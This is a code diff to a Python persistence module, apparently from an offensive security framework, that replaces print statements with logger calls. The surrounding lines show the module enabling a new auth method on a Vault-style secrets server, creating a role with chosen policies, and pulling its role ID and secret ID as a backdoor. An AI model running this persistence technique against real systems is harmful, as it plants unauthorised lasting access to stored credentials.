@@ -4,6 +4,7 @@ import json
 
 from ...context import ExecutionContext
 from ...registry import BaseExecutionModule, ExecutionResult, RiskLevel
+from core.logger import logger
 
 
 TIMEOUT = 10
@@ -57,7 +58,7 @@ class PersistenceModule(BaseExecutionModule):
         results = {}
         errors = []
 
-        print(f"[*] [ACTIVE] Installing persistence at auth path: {auth_path}")
+        logger.info(f"[*] [ACTIVE] Installing persistence at auth path: {auth_path}")
 
         # 1. Auth method aktifleştir
         try:
@@ -75,7 +76,7 @@ class PersistenceModule(BaseExecutionModule):
             
             if response.status_code in [200, 204]:
                 results["auth_enabled"] = True
-                print(f"[+] [ACTIVE] Auth method '{auth_path}' enabled.")
+                logger.info(f"[+] [ACTIVE] Auth method '{auth_path}' enabled.")
             else:
                 errors.append(f"Auth enable failed: HTTP {response.status_code}")
                 results["auth_enabled"] = False
@@ -111,7 +112,7 @@ class PersistenceModule(BaseExecutionModule):
             
             if response.status_code in [200, 204]:
                 results["role_created"] = True
-                print(f"[+] [ACTIVE] Role '{role_name}' created with policies: {policies}")
+                logger.info(f"[+] [ACTIVE] Role '{role_name}' created with policies: {policies}")
             else:
                 errors.append(f"Role create failed: HTTP {response.status_code}")
                 results["role_created"] = False
@@ -141,7 +142,7 @@ class PersistenceModule(BaseExecutionModule):
                 data = response.json()
                 role_id = data.get("data", {}).get("role_id")
                 results["role_id"] = role_id
-                print(f"[+] [ACTIVE] Role ID: {role_id}")
+                logger.info(f"[+] [ACTIVE] Role ID: {role_id}")
             
             # Secret ID oluştur
             secret_id_url = f"{base_url}/v1/auth/{auth_path}/role/{role_name}/secret-id"
@@ -154,9 +155,9 @@ class PersistenceModule(BaseExecutionModule):
                 secret_id = data.get("data", {}).get("secret_id")
                 results["secret_id"] = secret_id
                 if secret_id:
-                    print(f"[+] [ACTIVE] Secret ID: {secret_id[:8]}...")
+                    logger.info(f"[+] [ACTIVE] Secret ID: {secret_id[:8]}...")
                 else:
-                    print("[!] [ACTIVE] Secret ID response contained no secret_id")
+                    logger.warning("[!] [ACTIVE] Secret ID response contained no secret_id")
                 
         except Exception as e:
             errors.append(f"Credential retrieval error: {str(e)}")
